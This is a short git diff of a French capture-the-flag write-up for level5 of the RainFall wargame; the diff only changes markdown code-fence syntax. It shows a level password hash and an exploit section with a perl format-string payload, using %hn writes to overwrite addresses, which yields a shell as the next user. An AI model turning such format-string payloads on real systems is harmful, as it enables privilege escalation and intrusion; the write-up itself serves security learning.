@@ -4,7 +4,7 @@ pass : `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
 
 ## Sources :
 
-```c=
+```c
 #include <stdio.h>
 
 // 0x080484a4
@@ -138,7 +138,7 @@ Il ne reste plus qu'à lancer la commande et récuperer le pass.
 
 ## Exploit :
 
-```shell=
+```shell
 level5@RainFall:~$ (perl -e 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4\$hn%31904x%5\$hn"';cat) | ./level5
 whoami
 level6
